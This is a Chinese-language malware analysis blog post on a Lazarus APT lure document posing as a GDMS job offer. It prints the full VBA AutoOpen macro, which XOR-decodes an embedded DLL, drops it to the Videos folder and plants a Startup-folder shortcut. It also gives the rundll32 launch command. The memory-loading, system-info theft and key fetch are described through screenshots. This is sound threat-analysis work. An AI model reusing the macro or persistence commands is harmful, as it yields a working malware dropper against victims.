---
title: Lazarus分析
author: 此生汝梦 
categories:
- APT分析
tags: 
- Evilnum
date: 2021-03-05
excerpt: 对Lazarus简单分析学习
---

# 前言
Lazarus APT组织是疑似具有东北亚背景的APT团伙，该组织攻击活动最早可追溯到2007年，其早期主要针对韩国、美国等政府机构，以窃取敏感情报为目的。自2014年后，该组织开始针对全球金融机构 、虚拟货币交易所等为目标，进行以敛财为目的的攻击活动。
据公开情报显示，2014 年索尼影业遭黑客攻击事件，2016 年孟加拉国银行数据泄露事件，2017年美国国防承包商、美国能源部门及英国、韩国等比特币交易所被攻击等时间都出自Lazarus之手。
这次分析的是Lazarus以GDMS公司招聘高级业务经理为诱饵的事件。
# 样本详情
MD5：8ED89D14DEE005EA59634AADE15DBA97
可以从微步下载
# 概述
样本本身是一个word文档，但是当打开文档时，不会显示正确的内容，诱使用户启用宏，启用宏之后样本释放恶意DLL到%HOMEPATH%\Videos\localdb.db，释放恶意快捷方式到启动菜单%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Recent.lnk使其能够开机自启，同时
释放包含真正文档内容的word到临时目录下，名称与样本名称相同，然后打开临时目录下的word文档并关闭样本文档。
临时目录下的word文档包含一个自动运行的宏用于启动localdb.db，
localdb.db会在内容解密并加载运行一个PE文件，该PE会收集并发送计算机的敏感信息到指定网址，并从指定网址接受解密key，用于解密运行样本中包含的另一个PE文件。
整体流程如下：

![未命名文件](/pic/sunyu/Lazarus_APT/未命名文件.png)



# 样本分析

## 样本宏分析

使用olevba工具获取样本的宏如下：

```
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" ( _
    ByVal CodePage As Long, _
    ByVal dwFlags As Long, _
    ByVal lpMultiByteStr As LongPtr, _
    ByVal cchMultiByte As Long, _
    ByVal lpWideCharStr As LongPtr, _
    ByVal cchWideChar As Long) As Long

Private Function BytesLength(abBytes() As Byte) As Long
    On Error Resume Next
    BytesLength = UBound(abBytes) - LBound(abBytes) + 1
End Function

Public Function Utf8BytesToString(abUtf8Array() As Byte) As String
    Dim nBytes As Long
    Dim nChars As Long
    Dim strOut As String
    Utf8BytesToString = ""
    nBytes = BytesLength(abUtf8Array)
    If nBytes <= 0 Then Exit Function
    nChars = MultiByteToWideChar(CP_UTF8, 0&, VarPtr(abUtf8Array(0)), nBytes, 0&, 0&)
    strOut = String(nChars, 0)
    nChars = MultiByteToWideChar(CP_UTF8, 0&, VarPtr(abUtf8Array(0)), nBytes, StrPtr(strOut), nChars)
    Utf8BytesToString = Left$(strOut, nChars)
End Function

Function bin2var(filename As String) As String
    Dim f As Integer
    f = FreeFile()
    Open filename For Binary Access Read Lock Write As #f
        bin2var = Space(FileLen(filename))
        Get #f, , bin2var
    Close #f
End Function

Sub AutoOpen()
    Dim dllData, lnkData, nDllSize, nlnkSize, ntmpSize, oShape, oObject, dllpath, lnkPath, ntospath As String

    ntospath = Environ("SystemRoot") & "\system32\mshtml.dll"
On Error GoTo error

    With ActiveDocument

    dllData = .Shapes(1).TextFrame.TextRange
    lnkData = .Shapes(2).TextFrame.TextRange
    Dim dllBin(211455) As Byte
    nDllSize = 211455
    
    Dim lnkBin(1441) As Byte
    nlnkSize = 1441

    Dim tmpBin
    tmpBin = bin2var(ntospath)
    
    Set oShape = .InlineShapes(1)
    Set oObject = oShape.OLEFormat.Object
    oObject.SaveAs Environ("temp") & "\" & ThisDocument.Name
    oObject.Close
    Set oObject = Nothing
    
    End With
    
    dllpath = Environ("HOMEPATH") & "\Videos\localdb.db"

    Open dllpath For Binary Lock Write As #1
    
    For inx = 0 To nDllSize
        dllBin(inx) = CByte("&H" + Mid(dllData, inx * 2 + 1, 2))
        dllBin(inx) = dllBin(inx) Xor 163
    Next inx
    
    Put #1, 1, dllBin
    Close #1
    
    lnkPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup" & "\" & "Recent.lnk"

    Open lnkPath For Binary Lock Write As #1
    
    For inx = 0 To nlnkSize
        lnkBin(inx) = CByte("&H" + Mid(lnkData, inx * 2 + 1, 2))
        lnkBin(inx) = lnkBin(inx) Xor 163
    Next inx
    
    Put #1, 1, lnkBin
    Close #1
error:
    Documents.Open Environ("temp") & "\" & ThisDocument.Name
    ThisDocument.Close (wdDoNotSaveChanges)

End Sub

Function widowjgibnow()
    Dim pid, varPath, orgPath, path, objFSO, objFile, strMByte() As Byte, strWide As String

    pid = vwerbethr()

    With ActiveDocument

    varPath = .path & "\" & ThisDocument.Name
    orgPath = Environ("temp") & "\" & ThisDocument.Name

    End With

    path = Environ("temp") & "\sqlite3.sql"

    Const ForAppending = 8

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(path, True, True)
    
    strMByte = CStr(varPath) & "|" & CStr(orgPath) & "|" & pid
    
    objFile.WriteLine strMByte
    objFile.Close
End Function
```

从这个宏中可以清晰的看到其执行流程，释放同名word到临时目录

![image-20210305004426168](/pic/sunyu/Lazarus_APT/image-20210305004426168.png)

释放localdb.db到视频库

![image-20210305004458003](/pic/sunyu/Lazarus_APT/image-20210305004458003.png)

释放Recent.lnk到启动菜单

![image-20210305004602173](/pic/sunyu/Lazarus_APT/image-20210305004602173.png)

快捷方式用于调用localdb.db的导出函数

![image-20210305004647713](/pic/sunyu/Lazarus_APT/image-20210305004647713.png)

具体内容为：C:\Windows\System32\cmd.exe /c start /b C:\Windows\System32\rundll32.exe %HOMEPATH%\videos\localdb.db,ntSystemInfo qBzZN42AyWu6Qatd

然后关闭样本文档

![image-20210305004838235](/pic/sunyu/Lazarus_APT/image-20210305004838235.png)

打开释放的同名文档

![image-20210305004915232](/pic/sunyu/Lazarus_APT/image-20210305004915232.png)

该文档同样包含宏

```
Sub AutoOpen()
    Dim szAppLine, objShell
    
    szAppLine = "cmd /c start /b C:\Windows\System32\rundll32.exe %HOMEPATH%\videos\localdb.db,ntSystemInfo qBzZN42AyWu6Qatd"
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run szAppLine, 0, False
    Set objShell = Nothing
End Sub
```

再打开文档的同时调用shell 执行cmd /c start /b C:\Windows\System32\rundll32.exe %HOMEPATH%\videos\localdb.db,ntSystemInfo qBzZN42AyWu6Qatd

运行localdb.db的导出函数ntSystemInfo ，其中qBzZN42AyWu6Qatd为参数 用于验证是否为样本调用

## localdb.db导出函数ntSystemInfo 分析

函数首先进行计算，得出一个特定的字符串，然后将计算出的字符串与传入的参数进行对比，如果二者相同则进行下一步，否则退出

![image-20210305005535736](/pic/sunyu/Lazarus_APT/image-20210305005535736.png)

![image-20210305010720322](/pic/sunyu/Lazarus_APT/image-20210305010720322.png)

对加密数据进行异或解密（第一层），将解密后的数据复制到申请的内存中，然后对其进行加载操作。

![image-20210305011807075](/pic/sunyu/Lazarus_APT/image-20210305011807075.png)

一层解密前的数据

![image-20210305011907602](/pic/sunyu/Lazarus_APT/image-20210305011907602.png)

解密后

![image-20210305011927273](/pic/sunyu/Lazarus_APT/image-20210305011927273.png)

二层解密并复制之后

![image-20210305012115369](/pic/sunyu/Lazarus_APT/image-20210305012115369.png)

内存加载

![image-20210305012926131](/pic/sunyu/Lazarus_APT/image-20210305012926131.png)



## ntSystemInfo 内存解密加载文件分析

其主要内容就是创建了一个线程，通过线程回调函数收集发送系统信息

![image-20210305013246760](/pic/sunyu/Lazarus_APT/image-20210305013246760.png)

解密URL,向解密的URL地址发送收集的信息。

![image-20210305013344110](/pic/sunyu/Lazarus_APT/image-20210305013344110.png)

解密url

​	解密前

![image-20210305014747524](/pic/sunyu/Lazarus_APT/image-20210305014747524.png)

​	解密后

![image-20210305014900092](/pic/sunyu/Lazarus_APT/image-20210305014900092.png)

收集系统信息和进程快照信息

![image-20210305014951137](/pic/sunyu/Lazarus_APT/image-20210305014951137.png)



收集到的信息如下

![image-20210305020124080](/pic/sunyu/Lazarus_APT/image-20210305020124080.png)

然后对其进行加密

![image-20210305020302979](/pic/sunyu/Lazarus_APT/image-20210305020302979.png)

![image-20210305020354643](/pic/sunyu/Lazarus_APT/image-20210305020354643.png)

将加密后的数据发送到指定网址

![image-20210305020445275](/pic/sunyu/Lazarus_APT/image-20210305020445275.png)

发送结束后，再从指定网址读取一小段数据

![image-20210305020616100](/pic/sunyu/Lazarus_APT/image-20210305020616100.png)

使用接收到的数据作为KEY 对加密数据进行解密并内存加载

![image-20210305020630338](/pic/sunyu/Lazarus_APT/image-20210305020630338.png)

内存加载

![image-20210305020740132](/pic/sunyu/Lazarus_APT/image-20210305020740132.png)

此处因为url失效,所以无法继续分析

# 总结

该样本，主要是通过诱使用户启用宏来执行之后的一系列恶意代码。所以，对于来源并不可信，以及明显可疑的带宏文档，一定不要轻易启用宏，以免在不经意间中招。